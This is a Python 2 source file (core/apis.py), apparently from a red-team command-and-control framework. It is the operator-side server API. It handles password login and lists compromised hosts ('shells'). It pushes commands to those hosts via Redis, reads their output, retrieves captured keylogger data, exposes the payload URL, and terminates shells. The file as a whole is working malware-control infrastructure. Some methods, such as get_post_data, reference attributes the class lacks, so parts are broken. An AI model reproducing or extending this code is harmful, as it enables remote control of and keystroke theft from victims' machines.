#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/apis.py
"""

import hashlib
import json
import base64
import os
import fnmatch
from flask import Flask, session, request
from urllib import quote_plus
from core.websync import Sync
from core.utils import Utils
from core.log import Log


class FlaskFactory(Flask):

    """
    TODO: Implement all the same feature as the CLI:
            'fetch',
            'exec',
            'read',
            'upload',
            'ps',
            'inject',
            'alias',
            'delay',
            'help',
    """

    def init(self, config, cli):
        self.sync = Sync(config)
        self.secret_key = Utils.gen_str(32)
        self.session = session
        self.request = request
        self.internal_config = config
        self.sql = self.internal_config.get('mysql')
        self.redis = self.internal_config.get('redis')
        self.cli = cli
        self.active_users = []
        self.msgs = []
        self.cmds = []
        self.username = ''
        self.command = ''

    def auth(self):
        if 'authenticated' in self.session:
            return True
        return False

    def get_user(self):
        if 'username' in self.session:
            return self.session['username']
        return 'unknown'

    def set_user(self):
        self.session['authenticated'] = True
        self.session['uid'] = Utils.guid()
        self.session['username'] = request.form['username'].strip()
        self.session['password'] = hashlib.sha512(request.form['password'].strip()).hexdigest()
        self.active_users.append(str(self.session['username']))
        Log.log_event('User Login', '%s' % str(self.session['username']))

    def post_login(self):
        try:
            if str(request.form['username'].strip()) in self.active_users:
                return False
            if self.request.form['password'].strip() == self.internal_config.get('server-password'):
                self.set_user()
                return True
            return False
        except:
            pass
        return False

    def get_username(self):
        return self.session['username']

    def get_password(self):
        return self.session['password']

    def logout(self):
        try:
            self.active_users.remove(str(self.session['username']))
            Log.log_event('User Logout', '%s' % str(self.session['username']))
            self.session.pop('username')
            self.session.pop('authenticated')
        except:
            pass

    def send_msg(self, msg):
        self.msgs.append(msg)
        return ''

    def get_msgs(self):
        return self.msgs

    def hook_shell(self, id):
        uid = self.session['uid']
        return self.redis.add_active_user(uid, id)

    def unhook_shell(self, id):
        uid = self.session['uid']
        return self.redis.remove_active_user(uid, id)

    def send_cmd(self, id, cmd, username,):
        cmd_guid = Utils.guid()
        self.redis.append_shell_data(id, '[%s] %s Sending: \n%s\n\n' % (Utils.timestamp(), username, cmd))
        Log.log_shell(id, 'Sending', cmd, username=username)
        return self.redis.push_cmd(id, cmd, cmd_guid, username)

    def html_escape(self, data):
        html_escape_table = {
            '&': '&amp;',
            '"': '&quot;',
            "'": '&apos;',
            '>': '&gt;',
            '<': '&lt;',
            }
        return ''.join(html_escape_table.get(c, c) for c in data)

    def get_output(self, id):
        return self.sync.get_cmd_output(self.session['uid'], id)

    def get_input(self, id):
        return self.sync.get_cmd_send(self.session['uid'], id)

    def get_ip(self):
        host = self.internal_config.get('http-host')
        return host

    def get_port(self):
        port = self.internal_config.get('http-port')
        return port

    def get_log_date(self, name):
        dates = fnmatch.filter(os.listdir(os.getcwd() + '/logs/'), '*-*-*')
        log_dates = []
        logs = ['event', 'http', 'error', 'chat']
        for date in dates:
            if name in logs:
                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), '%s.log' % name)
                if file_name:
                    if date not in log_dates:
                        log_dates.append(date)

        return sorted(log_dates, key=lambda d: map(int, d.split('-')))

    def get_log_data(self, date, name):
        logs = ['event', 'http', 'error', 'chat']

        if name in logs:
            try:
                path = '%s/logs/%s/%s.log' % (os.getcwd(), date, name)
                return open(path, 'r').read()
            except:
                return 'No recent activity.'

        if name == 'dashboard':
            try:
                path = '%s/logs/%s/event.log' % (os.getcwd(), date)
                return open(path, 'r').read()
            except:
                return 'No recent activity'


    def get_shells(self):
        try:
            shells_list = []
            shells = self.redis.get_all_shells()
            for shell in shells:
                shell_info = {
                    'shell_ip': shell.split(':')[2],
                    'shell_id': shell.split(':')[0],
                    'shell_prompt': self.redis.get_prompt(shell.split(':')[0]).split(' ')[1],
                    'shell_hostname': self.redis.get_prompt(shell.split(':')[0]).split(' ')[0],
                    'shell_timestamp': self.redis.get_data(shell),
                    }
                shells_list.append(shell_info)
            return shells_list
        except:
            pass

    def get_shell_domain(self, id):
        domain = self.redis.get_prompt(id).split(' ')[1].split('\\')[0]
        return domain

    def get_shell_hostname(self, id):
        hostname = self.redis.get_prompt(id).split(' ')[0]
        return hostname

    def get_shell_user(self, id):
        user = self.redis.get_prompt(id).split(' ')[1].split('\\')[1]
        return user

    def get_payload_name(self):
        return self.internal_config.get('http-download-path')

    def get_payload_url(self):
        return self.internal_config.get('callback-url')

    def get_protocol(self):
        if self.internal_config.get('https-enabled') == 'on':
            return 'https://'
        else:
            return 'http://'

    def get_keylogger(self, id):
        return self.redis.get_keylogger_data(id)

    def get_shell(self, id):
        return self.redis.get_shell_data(id)

    def get_session_uid(self):
        return self.session['uid']

    def delete_shell(self, id, username):
        shells = self.redis.get_all_shells()
        self.send_cmd(id, 'exit', username)
        for shell in shells:
            if id in shell:
                self.redis.delete_entry(shell)





class ServerApi:

    def __init__(self, config, request):
        self.config = config
        self.request = request
        self.redis = self.config.get('redis')
        self.output = {}
        self.output['success'] = 1

    def process(self):
        try:
            callback = self.request.path.split('/')[2].lower()
            if callback == 'login':
                self.auth()
            elif callback == 'list':
                self.get_shells()
            elif callback == 'shell':
                self.get_shell_output()
        except:
            pass

        return json.dumps(self.output)

    def get_header(self, key):
        return self.request.headers.getheader(key)

    def auth(self):
        if hashlib.sha512(self.config.get('server-password')).hexdigest() == self.get_header('Authorization'):
            self.output['authorized'] = 1
            return True
        self.output['authorized'] = 0
        return False

    def get_shells(self):
        if self.auth():
            shells = []
            for shell in self.redis.get_all_shells():
                guid = shell.split(':')[0]
                prompt = self.redis.get_prompt(guid)
                shells.append('%s %s' % (guid, prompt))
            self.output['shells'] = shells

    def get_shell_output(self):
        if self.auth():
            try:
                guid = self.request.path.split('/')[3]
                guid = Utils.validate_guid(guid)
                path = Log.get_current_path('shell_%s.log' % guid)
                data = Utils.load_file(path, False, False)
                self.output['data'] = base64.b64encode(data)
            except:
                return

    def send_shell_cmd(self):
        if self.auth():
            try:
                guid = self.request.path.split('/')[3]
                guid = Utils.validate_guid(guid)
                self.redis.push_cmd(guid, self.get_post_data(), Utils.guid())
            except:
                return

    def get_post_data(self):
        length = 0
        if not self.headers.getheader('Content-Length') == None:
            length = int(self.headers.getheader('Content-Length'))
        return self.rfile.read(length)
